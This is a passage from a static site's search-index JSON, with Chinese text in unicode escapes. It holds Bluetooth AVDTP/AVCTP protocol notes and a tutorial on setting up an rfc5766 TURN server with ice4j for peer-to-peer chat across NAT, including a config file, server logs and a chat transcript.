\u6d41\u88ab\u6253\u5f00\uff1a\u7528\u4e8e\u5f00\u59cb\u5f62\u6210\u6d41\uff1b\u6d41\u6682\u505c\u65f6\uff1a\u7528\u4e8e\u91cd\u65b0\u5f62\u6210\u6d41\u3002 AVDTP_CLOSE 0x08 \u5bf9SEP\u5173\u95ed AVDTP_SUSPEND 0x09 \u8bf7\u6c42SEP\u6682\u505c AVDTP_SECURITY_CONTROL 0x0A \u8bbe\u7f6e\u8bbe\u5907\u5185\u5bb9\u4fdd\u62a4\u3001\u6216\u8005\u8bf7\u6c42\u8bbe\u5907\u72b6\u51b5\u4fe1\u606f AVDTP_ABORT 0x0B \u4e2d\u65ad\u6b63\u5728\u5efa\u7acb\u6216\u8005\u4f20\u8f93\u7684\u8fc7\u7a0b AVDTP_GET_ALL_CAPABILITIES AVDTP_DELAYREPORT","title":"4.\u97f3\u89c6\u9891\u5206\u53d1\u534f\u8baeAVDTP"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/#5avctp","text":"AVCTP \u53ef\u4ee5\u4f7f\u97f3\u89c6\u9891\u8bbe\u5907\u540c\u65f6\u652f\u6301\u591a\u4e2a\u5e94\u7528\u6846\u67b6\uff0c\u6bcf\u4e2a\u5e94\u7528\u6846\u67b6\u5b9a\u4e49\u4e86\u5404\u81ea\u76f8\u5e94\u7684\u6d88\u606f\u683c\u5f0f\u4e0e\u5e94\u7528\u89c4\u5219\u3002","title":"5.\u97f3\u89c6\u9891\u63a7\u5236\u4f20\u8f93\u534f\u8baeAVCTP"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/#6","text":"\u84dd\u7259\u6838\u5fc3\u6280\u672f\u6982\u8ff0\uff08\u4e94\uff09\uff1a\u84dd\u7259\u534f\u8bae\u89c4\u8303\uff08irOBEX\u3001BNEP\u3001AVDTP\u3001AVCTP\uff09 \u539f\u6587\u94fe\u63a5\uff1a https://jacksmiththu.github.io/2017/08/08/\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u56db\uff09\u5e94\u7528\u5c42\u534f\u8bae/","title":"6.\u53c2\u8003\u94fe\u63a5"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/","text":"\u524d\u6bb5\u65f6\u95f4\u4e0a\u624b\u4e86NAT\u6253\u6d1e\u7c7b\u5e93ice4j\uff08ICE\u6846\u67b6\uff09\uff0c\u5f53\u65f6\u4f7f\u7528\u4e86numb.viagenie.ca\u7684\u516c\u5171STUN\u670d\u52a1\u5668\u3002\u6700\u8fd1\u53c8\u7f16\u8bd1\u4e86rfc5766-turn-server\uff0c\u4e8e\u662f\u4eca\u5929\u5c06\u4e24\u8005\u7ed3\u5408\u8d77\u6765\uff0c\u4e00\u4e2a\u4f5c\u4e3a\u670d\u52a1\u7aef\uff0c\u4e00\u4e2a\u4f5c\u4e3aPeer\u7aef\u7684\u534f\u8bae\uff0c\u8bd5\u9a8c\u5e7f\u57df\u7f51\u7a7f\u900f\u591a\u7ea7\u8def\u7531\u5373\u65f6\u70b9\u5bf9\u70b9\u901a\u8baf\uff0c\u5e76\u53d6\u5f97\u4e86\u6210\u529f\u3002 \u670d\u52a1\u7aef \u7f16\u8bd1\u5b89\u88c5 rfc5766-turn-server\u662f\u8c37\u6b4c\u63a8\u8350\u7684turn\u5f00\u6e90\u9879\u76ee\uff0c\u7ecf\u5e38\u4f5cWebRTC\u7684\u670d\u52a1\u5668\u7aef\u4f7f\u7528\u3002\u5173\u4e8erfc5766-turn-server\u5728Windows\u6216Ubuntu\uff08Linux\uff09\u4e0b\u7684\u7f16\u8bd1\uff0c\u8bf7\u53c2\u8003 http://www.hankcs.com/program/network/compile-rfc5766-turn-server-to-build-turn-server.html \u3002\u8fd9\u91cc\u5047\u5b9a\u4f60\u5df2\u7ecf\u7f16\u8bd1\u5b8c\u6210\uff0c\u8f93\u5165 $ turnserver -h \u5f97\u5230\u5982\u4e0b\u7ed3\u679c\u8bf4\u660e\u7f16\u8bd1\u6210\u529f\uff1a \u914d\u7f6e rfc5766-turn-server\u662f\u5229\u7528\u914d\u7f6e\u6587\u4ef6\u6765\u5b9a\u4e49\u81ea\u5df1\u7684\u529f\u80fd\u8868\u73b0\u7684\uff0c\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u5728\u4e0b\u5217\u8def\u5f84\u90fd\u6709\u9ed8\u8ba4\u7684\u914d\u7f6e\u6587\u4ef6\uff1a /usr/local/etc/turnserver.conf.default rfc5766-turn-server\u68c0\u51fa\u76ee\u5f55/examples/etc/turnserver.conf \u968f\u4fbfcp\u4e00\u4e2a\u51fa\u6765\u5c31\u80fd\u7528\uff0c\u5982\u679c\u4f60\u5b9e\u5728\u627e\u4e0d\u5230\uff0c\u53ef\u4ee5\u4ece\u6211\u8fd9\u91cc\u4e0b\u8f7d\u4e00\u4e2a turnserver-conf.zip \u3002 \u914d\u7f6e\u9879\u5f88\u591a\uff0c\u4f46\u662f\u521d\u7ea7\u7528\u6237\u7528\u5f97\u4e0a\u7684\u53ea\u6709\u4e24\u4e2a\u3002 \u914d\u7f6e\u5916\u7f51IP \u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165\u4e00\u53e5 external-ip=180.160.188.246 \u540e\u9762\u7684IP\u662f\u4f60\u7684\u670d\u52a1\u5668\u7684\u5916\u7f51IP\uff0c\u6bd4\u5982\uff1a \u6211\u7684\u8bd5\u9a8c\u6761\u4ef6\u6bd4\u8f83\u7b80\u964b\uff0c\u6ca1\u6709\u81ea\u5df1\u7684\u670d\u52a1\u5668\uff0c\u800c\u662f\u628a\u81ea\u5df1\u7684PC\u5f53\u4f5c\u4e86\u670d\u52a1\u5668\u4f7f\u7528\u3002\u53c8\u7531\u4e8e\u81ea\u5df1\u7684PC\u662f\u4f4d\u4e8e\u5c40\u57df\u7f51\u4e2d\uff0c\u6ca1\u6709\u81ea\u5df1\u7684\u5916\u7f51IP\uff0c\u6240\u4ee5\u9700\u8981\u5728\u8def\u7531\u5668\u4e0a\u505a\u4e00\u4e2a\u7aef\u53e3\u6620\u5c04\uff1a \u5176\u4e2d\uff0c192.168.1.103\u662f\u670d\u52a1\u5668\u7684\u5185\u7f51IP\uff0c3478\u662fturnserver\u670d\u52a1\u5360\u7528\u7684\u7aef\u53e3\u3002 \u914d\u7f6e\u7528\u6237\u540d\u548c\u5bc6\u7801 \u5728\u4ea7\u54c1\u7ea7\u7684\u573a\u666f\u4e2d\uff0crfc5766-turn-server\u652f\u6301\u6570\u636e\u5e93\u548c\u52a8\u6001\u589e\u5220\u7528\u6237\u3002\u800c\u5728\u6211\u7684\u8fd9\u79cd\u5b9e\u9a8c\u4e2d\uff0c\u6211\u9009\u62e9\u9759\u6001\u5b9a\u4e49\u4e24\u4e2a\u7528\u6237\uff0c\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165: user=u1:p1 user=u2:p2 \u8fd9\u4ee3\u8868\u4e24\u4e2a\u7528\u6237\uff0c\u9075\u4ece \u7528\u6237\u540d:\u5bc6\u7801 \u7684\u683c\u5f0f\u3002 \u542f\u52a8rfc5766-turn-server sudo turnserver -c /\u4f60\u7684\u8def\u5f84/turnserver.conf \u6b64\u65f6\u4f1a\u8f93\u51fa\uff1a 0: log file opened: /var/log/turn_2409_2014-11-10.log 0: RFC 3489/5389/5766/5780/6062/6156 STUN/TURN Server Version Citrix-3.2.4.6 'Marshal West' 0: Max number of open files/sockets allowed for this process: 4096 0: Due to the open files/sockets limitation, max supported number of TURN Sessions possible is: 2000 (approximately) 0: ==== Show him the instruments, Practical Frost: ==== 0: TLS supported 0: DTLS supported 0: Redis supported 0: PostgreSQL supported 0: MySQL supported 0: OpenSSL compile-time version 0x1000106f: fresh enough 0: Default Net Engine version: 3 (UDP thread per CPU core) ===================================================== 0: WARNING: Cannot find userdb file: turnuserdb.conf: going without flat file user database. 0: WARNING: cannot find certificate file: turn_server_cert.pem (1) 0: WARNING: cannot start TLS and DTLS listeners because certificate file is not set properly 0: WARNING: cannot find private key file: turn_server_pkey.pem (1) 0: WARNING: cannot start TLS and DTLS listeners because private key file is not set properly 0: NO EXPLICIT LISTENER ADDRESS(ES) ARE CONFIGURED 0: ===========Discovering listener addresses: ========= 0: Listener address to use: 127.0.0.1 0: Listener address to use: 192.168.1.103 0: Listener address to use: ::1 0: ===================================================== 0: Total: 1 'real' addresses discovered 0: ===================================================== 0: NO EXPLICIT RELAY ADDRESS(ES) ARE CONFIGURED 0: ===========Discovering relay addresses: ============= 0: Relay address to use: 192.168.1.103 0: Relay address to use: ::1 0: ===================================================== 0: Total: 2 relay addresses discovered 0: ===================================================== 0: pid file created: /var/run/turnserver.pid 0: IO method (main listener thread): epoll (with changelist) 0: WARNING: I cannot support STUN CHANGE_REQUEST functionality because only one IP address is provided 0: Wait for relay ports initialization... 0: relay 192.168.1.103 initialization... 0: relay 192.168.1.103 initialization done 0: relay ::1 initialization... 0: relay ::1 initialization done 0: Relay ports initialization done 0: IO method (general relay thread): epoll (with changelist) 0: turn server id=0 created 0: IPv4. TCP listener opened on : 127.0.0.1:3478 0: IPv4. TCP listener opened on : 192.168.1.103:3478 0: IPv6. TCP listener opened on : ::1:3478 0: IO method (general relay thread): epoll (with changelist) 0: turn server id=1 created 0: IPv4. TCP listener opened on : 127.0.0.1:3478 0: IPv4. TCP listener opened on : 192.168.1.103:3478 0: IPv6. TCP listener opened on : ::1:3478 0: IPv4. UDP listener opened on: 127.0.0.1:3478 0: IPv4. UDP listener opened on: 192.168.1.103:3478 0: IPv6. UDP listener opened on: ::1:3478 0: Total UDP servers: 0 0: Total General servers: 2 0: IO method (auth thread): epoll (with changelist) 0: IO method (cli thread): epoll (with changelist) 0: IPv4. CLI listener opened on : 127.0.0.1:5766 \u8fd9\u6837\u5c31\u6210\u529f\u542f\u52a8\u4e86\u3002 Peer\u7aef \u68c0\u51fa\u4ee3\u7801 \u6211\u5df2\u5c06\u5168\u90e8\u4ee3\u7801\u5f00\u6e90\u5230 https://github.com/hankcs/IceNAT \uff0c\u9700\u8981\u8bfb\u8005\u6dfb\u52a0ice4j\u7684\u4f9d\u8d56\u9879\uff0c\u5e76\u53c2\u8003\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c\u8bd5\u9a8c\u3002 \u4fee\u6539\u914d\u7f6e\u9879 Peer\u7aef\u7684\u57fa\u7840\u77e5\u8bc6\u8bf7\u53c2\u8003\u6211\u5199\u7684\u300a \u8bd5\u9a8cUDP\u6253\u6d1e\u7a7f\u900fNAT \u300b\uff0c\u8fd9\u6b21\u6211\u4e0d\u518d\u4f7f\u7528\u522b\u4eba\u7684\u670d\u52a1\u5668\uff0c\u7f16\u8f91IceClient\uff0c\u4fee\u6539turnServers\u548cstunServers\u7684\u5730\u5740\u548c\u5bc6\u7801\u4e3a\uff1a private String[] turnServers = new String[]{\"180.160.188.246:3478\"}; private String[] stunServers = new String[]{\"180.160.188.246:3478\"}; private String username = \"u1\"; private String password = \"p1\"; \u7f16\u8bd1\u4e00\u4efd\uff0c\u5907\u7528\uff0c\u6211\u79f0\u5b83\u4e3aPeer1\u3002Pee1\u8fd0\u884c\u4e8e\u6211\u5bbf\u820d\u7684\u5de5\u4f5c\u7ad9\u4e0a\uff0c\u5916\u7f51IP\u548c\u670d\u52a1\u5668\u76f8\u540c\uff08\u4f4d\u4e8e\u540c\u4e00\u5c40\u57df\u7f51\uff09\uff0c\u90fd\u662f\uff1a \u7136\u540e\u5c06\u7528\u6237\u540d\u548c\u5bc6\u7801\u4fee\u6539\u4e3a\uff1a private String username = \"u2\"; private String password = \"p2\"; \u62f7\u8d1d\u5230\u53e6\u4e00\u53f0\u7535\u8111\u4e0a\u53bb\u4f5c\u4e3aPeer2\uff0c\u5176\u4e2dPeer2\u7684\u5916\u7f51IP\u4e3a\uff1a \u8fd9\u662f\u6821\u56ed\u7f51\u7684\u5916\u7f51IP\uff0c\u5168\u6821\u4e0a\u4e07\u53f0PC\u5206\u5e03\u5728\u5c42\u5c42\u8def\u7531\u548c\u9632\u706b\u5899\u4e4b\u4e0b\uff0c\u6211\u7684\u53e6\u4e00\u53f0PC\u4e5f\u662f\u5176\u4e2d\u4e00\u53f0\uff0c\u6211\u7684\u76ee\u6807\u5c31\u662f\u7a7f\u900f\u969c\u788d\uff0c\u8fbe\u5230\u5e7f\u57df\u7f51\u901a\u8baf\u7684\u76ee\u7684\u3002 \u5f00\u59cb\u8bd5\u9a8c \u83b7\u53d6\u4fe1\u4ee4 Peer1\u548cPeer2\u8fd0\u884c\uff0c\u5206\u522b\u901a\u8fc7rfc5766-turn-server\u83b7\u53d6\u5230\u4e86\u81ea\u5df1\u7684SDP\u4fe1\u606f\uff08\u4fe1\u4ee4\uff09\uff1a Peer1\u2014\u2014 v=0 o=ice4j.org 0 0 IN IP4 180.160.188.246 s=- t=0 0 a=ice-options:trickle a=ice-ufrag:2mu8s196cnbrvi a=ice-pwd:3rapigabe9fl3b1949nb1c9637 m=text 59229 RTP/AVP 0 c=IN 180.160.188.246 IP4 a=mid:text a=candidate:1 1 udp 2130706431 192.168.1.100 8888 typ host a=candidate:2 1 udp 2130706431 fe80:0:0:0:38f0:a64b:a7a6:e8b6 8888 typ host a=candidate:4 1 udp 2113937151 fe80:0:0:0:2891:b74a:6050:22b3 8888 typ host a=candidate:3 1 udp 2113932031 192.168.124.1 8888 typ host a=candidate:5 1 udp 1677724415 180.160.188.246 11252 typ srflx raddr 192.168.1.100 rport 8888 a=candidate:6 1 udp 2815 180.160.188.246 59229 typ relay raddr 180.160.188.246 rport 11252 Peer2\u2014\u2014 v=0 o=ice4j.org 0 0 IN IP4 180.160.188.246 s=- t=0 0 a=ice-options:trickle a=ice-ufrag:8q3b1196cnip55 a=ice-pwd:7ua73q9prlqn1jbal7143fprsd m=text 52430 RTP/AVP 0 c=IN 180.160.188.246 IP4 a=mid:text a=candidate:1 1 udp 2130706431 10.2.203.96 6666 typ host a=candidate:2 1 udp 2130706431 fe80:0:0:0:448b:e2e1:7f4b:f0b8 6666 typ host a=candidate:3 1 udp 1677724415 58.32.217.55 6666 typ srflx raddr 10.2.203.96 rport 6666 a=candidate:4 1 udp 2815 180.160.188.246 52430 typ relay raddr 58.32.217.55 rport 6666 \u540c\u65f6\u53ef\u4ee5\u5728rfc5766-turn-server\u7684\u7ec8\u7aef\u770b\u5230\u8f93\u51fa\uff1a 7: handle_udp_packet: New UDP endpoint: local addr 192.168.1.103:3478, remote addr 180.160.188.246:10898 7: session 000000000000000001: user <>: incoming packet BINDING processed, success 7: session 000000000000000001: user <>: incoming packet message processed, error 401: Unauthorised 7: IPv4. Local relay addr: 192.168.1.103:54837 7: session 000000000000000001: new, username=<u1>, lifetime=600 7: session 000000000000000001: user <u1>: incoming packet ALLOCATE processed, success \u4ea4\u6362\u4fe1\u4ee4 \u7531\u4e8e\u6211\u8fd8\u6ca1\u6709\u5b9e\u73b0\u81ea\u5df1\u7684\u4fe1\u4ee4\u670d\u52a1\u5668\uff08SIP\uff09\uff0c\u6240\u4ee5\u901a\u8fc7\u7c7b\u4f3c\u7535\u5b50\u90ae\u4ef6\u590d\u5236\u7c98\u8d34\u7684\u65b9\u5f0f\u4ea4\u6362\u4e86\u4e24\u8005\u7684\u4fe1\u4ee4\u3002 \u4ea4\u6362\u540e\uff0c\u4e24\u4e2aPeer\u5f00\u59cb\u914d\u5bf9\uff0c\u914d\u5bf9\u8fc7\u7a0b\u7684\u8f93\u51fa\u8bf7\u53c2\u8003\u200d \u200d\u4ea4\u6362\u4fe1\u606f\u914d\u200d\u5bf9 \uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002\u200d \u804a\u5929 \u4e4b\u540e\u4e24\u8005\u5c31\u53ef\u4ee5\u804a\u5929\u4e86\uff1a Peer1 /192.168.1.103:52430 says: hello, i am from hello i get it,hi /192.168.1.103:52430 says: \u8bd5\u8bd5\u4e2d\u6587 \u6ca1\u95ee\u9898 /192.168.1.103:52430 says: \u6211\u5728\u6821\u56ed\u7f51\uff0c\u4f3c\u4e4e\u4e0d\u80fd\u8d70p2p\uff0c\u5e78\u4e8f\u6709turn\u670d\u52a1\u5668 \u5bf9\uff0c\u4f60\u7684ip\u662fturn\u670d\u52a1\u5668\u7684ip\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u8fd9\u6761\u6d88\u606f\u662f\u4eceturn\u670d\u52a1\u5668\u90a3\u91cc\u83b7\u53d6\u7684 /192.168.1.103:52430 says: \u597d\u5427\uff0c\u8fd9\u6837\u4e5f\u7b97\u5e7f\u57df\u7f51\u901a\u8baf\u6210\u529f\u4e86 \u884c\uff0c\u5c31\u8fd9\u6837\uff0c\u518d\u89c1 /192.168.1.103:52430 says: bye Peer2 hello, i am from hello /192.168.1.100:8888 says: i get it,hi \u8bd5\u8bd5\u4e2d\u6587 /192.168.1.100:8888 says: \u6ca1\u95ee\u9898 \u6211\u5728\u6821\u56ed\u7f51\uff0c\u4f3c\u4e4e\u4e0d\u80fd\u8d70p2p\uff0c\u5e78\u4e8f\u6709turn\u670d\u52a1\u5668 /192.168.1.100:8888 says: \u5bf9\uff0c\u4f60\u7684ip\u662fturn\u670d\u52a1\u5668\u7684ip\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u8fd9\u6761\u6d88\u606f\u662f\u4eceturn\u670d\u52a1\u5668\u90a3\u91cc\u83b7\u53d6\u7684 \u597d\u5427\uff0c\u8fd9\u6837\u4e5f\u7b97\u5e7f\u57df\u7f51\u901a\u8baf\u6210\u529f\u4e86 /192.168.1.100:8888 says: \u884c\uff0c\u5c31\u8fd9\u6837\uff0c\u518d\u89c1 bye \u53ef\u4ee5\u770b\u5230\u867d\u7136\u4e24\u8005\u5904\u4e8e\u4e0d\u540c\u7684\u5c40\u57df\u7f51\uff0c\u62e5\u6709\u4e0d\u540c\u7684\u5916\u7f51IP\uff0c\u4f46\u662f\u7531\u4e8ePeer1\uff08192.168.1.100\uff09\u4e0e\u670d\u52a1\u5668\uff08192.168.1.103\uff09\u5904\u4e8e\u540c\u4e00\u5c40\u57df\u7f51\uff0c\u6240\u4ee5Peer1\u4e00\u76f4\u5728\u7528\u5c40\u57df\u7f51\u548crfc5766-turn-server\u901a\u8baf\u3002 \u800cPeer2\u4e0ePeer1\u76f4\u8fde\u5931\u8d25\uff0c\u901a\u8fc7turn\u670d\u52a1\u5668\u4e2d\u8f6c\u6570\u636e\uff0c\u6240\u4ee5\u5728Peer1\u770b\u6765\uff0cPeer2\u7684IP\u662f192.168.1.103\uff0c\u4e0eturn\u670d\u52a1\u5668\u4e00\u6478\u4e00\u6837\u3002 \u9898\u5916\u8bdd\uff0c\u6211\u662f\u6709\u591a\u5bc2\u5bde\u624d\u80fd\u8ddf\u81ea\u5df1\u804a\u7684\u90a3\u4e48\u5f00\u5fc3\u7684\uff1f Reference http://blog.wnotes.net/blog/article/stun-server-on-aws-ec2 https://code.google.com/p/rfc5766-turn-server/wiki/turnserver \u539f\u6587\u94fe\u63a5\uff1a http://www.hankcs.com/program/network/actual-rfc5766-turn-server-and-ice4j-wide-area-network-communication.html","title":"\u5b9e\u6218rfc5766 turn server\u548cice4j\u5e7f\u57df\u7f51\u901a\u8baf"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#_1","text":"","title":"\u670d\u52a1\u7aef"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#_2","text":"rfc5766-turn-server\u662f\u8c37\u6b4c\u63a8\u8350\u7684turn\u5f00\u6e90\u9879\u76ee\uff0c\u7ecf\u5e38\u4f5cWebRTC\u7684\u670d\u52a1\u5668\u7aef\u4f7f\u7528\u3002\u5173\u4e8erfc5766-turn-server\u5728Windows\u6216Ubuntu\uff08Linux\uff09\u4e0b\u7684\u7f16\u8bd1\uff0c\u8bf7\u53c2\u8003 http://www.hankcs.com/program/network/compile-rfc5766-turn-server-to-build-turn-server.html \u3002\u8fd9\u91cc\u5047\u5b9a\u4f60\u5df2\u7ecf\u7f16\u8bd1\u5b8c\u6210\uff0c\u8f93\u5165 $ turnserver -h \u5f97\u5230\u5982\u4e0b\u7ed3\u679c\u8bf4\u660e\u7f16\u8bd1\u6210\u529f\uff1a","title":"\u7f16\u8bd1\u5b89\u88c5"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#_3","text":"rfc5766-turn-server\u662f\u5229\u7528\u914d\u7f6e\u6587\u4ef6\u6765\u5b9a\u4e49\u81ea\u5df1\u7684\u529f\u80fd\u8868\u73b0\u7684\uff0c\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u5728\u4e0b\u5217\u8def\u5f84\u90fd\u6709\u9ed8\u8ba4\u7684\u914d\u7f6e\u6587\u4ef6\uff1a /usr/local/etc/turnserver.conf.default rfc5766-turn-server\u68c0\u51fa\u76ee\u5f55/examples/etc/turnserver.conf \u968f\u4fbfcp\u4e00\u4e2a\u51fa\u6765\u5c31\u80fd\u7528\uff0c\u5982\u679c\u4f60\u5b9e\u5728\u627e\u4e0d\u5230\uff0c\u53ef\u4ee5\u4ece\u6211\u8fd9\u91cc\u4e0b\u8f7d\u4e00\u4e2a turnserver-conf.zip \u3002 \u914d\u7f6e\u9879\u5f88\u591a\uff0c\u4f46\u662f\u521d\u7ea7\u7528\u6237\u7528\u5f97\u4e0a\u7684\u53ea\u6709\u4e24\u4e2a\u3002","title":"\u914d\u7f6e"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#ip","text":"\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165\u4e00\u53e5 external-ip=180.160.188.246 \u540e\u9762\u7684IP\u662f\u4f60\u7684\u670d\u52a1\u5668\u7684\u5916\u7f51IP\uff0c\u6bd4\u5982\uff1a \u6211\u7684\u8bd5\u9a8c\u6761\u4ef6\u6bd4\u8f83\u7b80\u964b\uff0c\u6ca1\u6709\u81ea\u5df1\u7684\u670d\u52a1\u5668\uff0c\u800c\u662f\u628a\u81ea\u5df1\u7684PC\u5f53\u4f5c\u4e86\u670d\u52a1\u5668\u4f7f\u7528\u3002\u53c8\u7531\u4e8e\u81ea\u5df1\u7684PC\u662f\u4f4d\u4e8e\u5c40\u57df\u7f51\u4e2d\uff0c\u6ca1\u6709\u81ea\u5df1\u7684\u5916\u7f51IP\uff0c\u6240\u4ee5\u9700\u8981\u5728\u8def\u7531\u5668\u4e0a\u505a\u4e00\u4e2a\u7aef\u53e3\u6620\u5c04\uff1a \u5176\u4e2d\uff0c192.168.1.103\u662f\u670d\u52a1\u5668\u7684\u5185\u7f51IP\uff0c3478\u662fturnserver\u670d\u52a1\u5360\u7528\u7684\u7aef\u53e3\u3002","title":"\u914d\u7f6e\u5916\u7f51IP"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#_4","text":"\u5728\u4ea7\u54c1\u7ea7\u7684\u573a\u666f\u4e2d\uff0crfc5766-turn-server\u652f\u6301\u6570\u636e\u5e93\u548c\u52a8\u6001\u589e\u5220\u7528\u6237\u3002\u800c\u5728\u6211\u7684\u8fd9\u79cd\u5b9e\u9a8c\u4e2d\uff0c\u6211\u9009\u62e9\u9759\u6001\u5b9a\u4e49\u4e24\u4e2a\u7528\u6237\uff0c\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u52a0\u5165: user=u1:p1 user=u2:p2 \u8fd9\u4ee3\u8868\u4e24\u4e2a\u7528\u6237\uff0c\u9075\u4ece \u7528\u6237\u540d:\u5bc6\u7801 \u7684\u683c\u5f0f\u3002","title":"\u914d\u7f6e\u7528\u6237\u540d\u548c\u5bc6\u7801"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#rfc5766-turn-server","text":"sudo turnserver -c /\u4f60\u7684\u8def\u5f84/turnserver.conf \u6b64\u65f6\u4f1a\u8f93\u51fa\uff1a 0: log file opened: /var/log/turn_2409_2014-11-10.log 0: RFC 3489/5389/5766/5780/6062/6156 STUN/TURN Server Version Citrix-3.2.4.6 'Marshal West' 0: Max number of open files/sockets allowed for this process: 4096 0: Due to the open files/sockets limitation, max supported number of TURN Sessions possible is: 2000 (approximately) 0: ==== Show him the instruments, Practical Frost: ==== 0: TLS supported 0: DTLS supported 0: Redis supported 0: PostgreSQL supported 0: MySQL supported 0: OpenSSL compile-time version 0x1000106f: fresh enough 0: Default Net Engine version: 3 (UDP thread per CPU core) ===================================================== 0: WARNING: Cannot find userdb file: turnuserdb.conf: going without flat file user database. 0: WARNING: cannot find certificate file: turn_server_cert.pem (1) 0: WARNING: cannot start TLS and DTLS listeners because certificate file is not set properly 0: WARNING: cannot find private key file: turn_server_pkey.pem (1) 0: WARNING: cannot start TLS and DTLS listeners because private key file is not set properly 0: NO EXPLICIT LISTENER ADDRESS(ES) ARE CONFIGURED 0: ===========Discovering listener addresses: ========= 0: Listener address to use: 127.0.0.1 0: Listener address to use: 192.168.1.103 0: Listener address to use: ::1 0: ===================================================== 0: Total: 1 'real' addresses discovered 0: ===================================================== 0: NO EXPLICIT RELAY ADDRESS(ES) ARE CONFIGURED 0: ===========Discovering relay addresses: ============= 0: Relay address to use: 192.168.1.103 0: Relay address to use: ::1 0: ===================================================== 0: Total: 2 relay addresses discovered 0: ===================================================== 0: pid file created: /var/run/turnserver.pid 0: IO method (main listener thread): epoll (with changelist) 0: WARNING: I cannot support STUN CHANGE_REQUEST functionality because only one IP address is provided 0: Wait for relay ports initialization... 0: relay 192.168.1.103 initialization... 0: relay 192.168.1.103 initialization done 0: relay ::1 initialization... 0: relay ::1 initialization done 0: Relay ports initialization done 0: IO method (general relay thread): epoll (with changelist) 0: turn server id=0 created 0: IPv4. TCP listener opened on : 127.0.0.1:3478 0: IPv4. TCP listener opened on : 192.168.1.103:3478 0: IPv6. TCP listener opened on : ::1:3478 0: IO method (general relay thread): epoll (with changelist) 0: turn server id=1 created 0: IPv4. TCP listener opened on : 127.0.0.1:3478 0: IPv4. TCP listener opened on : 192.168.1.103:3478 0: IPv6. TCP listener opened on : ::1:3478 0: IPv4. UDP listener opened on: 127.0.0.1:3478 0: IPv4. UDP listener opened on: 192.168.1.103:3478 0: IPv6. UDP listener opened on: ::1:3478 0: Total UDP servers: 0 0: Total General servers: 2 0: IO method (auth thread): epoll (with changelist) 0: IO method (cli thread): epoll (with changelist) 0: IPv4. CLI listener opened on : 127.0.0.1:5766 \u8fd9\u6837\u5c31\u6210\u529f\u542f\u52a8\u4e86\u3002","title":"\u542f\u52a8rfc5766-turn-server"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#peer","text":"","title":"Peer\u7aef"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#_5","text":"\u6211\u5df2\u5c06\u5168\u90e8\u4ee3\u7801\u5f00\u6e90\u5230 https://github.com/hankcs/IceNAT \uff0c\u9700\u8981\u8bfb\u8005\u6dfb\u52a0ice4j\u7684\u4f9d\u8d56\u9879\uff0c\u5e76\u53c2\u8003\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c\u8bd5\u9a8c\u3002","title":"\u68c0\u51fa\u4ee3\u7801"},{"location":"tmp/%E5%AE%9E%E6%88%98rfc5766-turn-server%E5%92%8Cice4j%E5%B9%BF%E5%9F%9F%E7%BD%91%E9%80%9A%E8%AE%AF/#_6","text":"Peer\u7aef\u7684\u57fa\u7840\u77e5\u8bc6\u8bf7\u53c2\u8003\u6211\u5199\u7684\u300a \u8bd5\u9a8cUDP\u6253\u6d1e\u7a7f\u900fNAT \u300b\uff0c\u8fd9\u6b21\u6211\u4e0d\u518d\u4f7f\u7528\u522b\u4eba\u7684\u670d\u52a1\u5668\uff0c\u7f16\u8f91IceClient\uff0c\u4fee\u6539turnServers\u548cstunServers\u7684\u5730\u5740\u548c\u5bc6\u7801\u4e3a\uff1a private String[] turnServers = new String[]{\"180.160.188.246:3478\"}; private String[] stunServers = new String[]{\"180.160.188.246:3478\"}; private String username = \"u1\"; private String password = \"p1\"; 